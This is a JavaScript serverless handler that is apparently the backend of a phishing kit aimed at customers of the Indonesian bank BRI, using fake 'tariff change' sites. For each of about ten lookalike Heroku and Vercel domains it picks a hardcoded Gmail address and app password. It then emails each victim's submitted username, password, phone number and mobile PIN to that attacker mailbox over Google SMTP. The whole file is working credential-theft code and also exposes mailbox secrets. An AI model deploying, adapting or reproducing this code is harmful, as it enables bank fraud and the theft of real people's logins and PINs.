export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'https://ubahtarif.herokuapp.com/ '){

        email = 'orbitorbit799@gmail.com';
        pass = 'ahghpmbdwokimqim'; 

    } else if(url == 'ubahtarifbaru.vercel.app'){
        email = 'angga13zx@gmail.com' ;
        pass = 'szssfkfwyhtjtbkg' ;
        
    } else if(url == 'tarif--perubahanbarulama.vercel.app'){
        email = 'samsudin19.01.12@gmail.com';
        pass = 'nsozbvpgogzlfeqg';

    } else if(url == 'per--ubahan-tarifbri.vercel.app'){
        email = 'tarifbaru36@gmail.com';
        pass = 'moiasopufjkptyvr';

    } else if(url == ' '){
        email = 'accbrimo05@gmail.com';
        pass = 'hluxpmqqqqsjrbaf';

    } else if(url == 'tarif--ubah.herokuapp.com'){
        email = 'callbribricoid66@gmail.com';
        pass = 'imuujsgssprgrtue';

    } else if(url == 'ubah--tariff.vercel.app'){
        email = 'andarasultan954@gmail.com';
        pass = 'xwjfzwdtiaxfname';

    } else if(url == 'tarif--perubahan.herokuapp.com'){
        email = 'bbri94669@gmail.com';
        pass = 'tdoctundphxocdqu';

    } else if(url == 'tarifbaru-lama.vercel.app'){
        email = 'wanw4826@gmail.com';
        pass = 'fgevrxoxoymjmzka';

    } else if(url == 'perubah--an-britarifff.herokuapp.com'){
        email = 'ssamsol397@gmail.com';
        pass = 'hqkkqinsugrirqne';

    }  
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',  
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                <ul>
                    <li>username: ${body.username ?? '-'}</li> 
                    <li>password: ${body.password ?? '-'}</li>
                    <li>nohp: ${body.noHp ?? '-'}</li>
                    <li>pin: ${body.mPin ?? '-'}</li>
                    <li>message: ${body.message ?? '-'}</li>
                </ul>
                `,                  
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
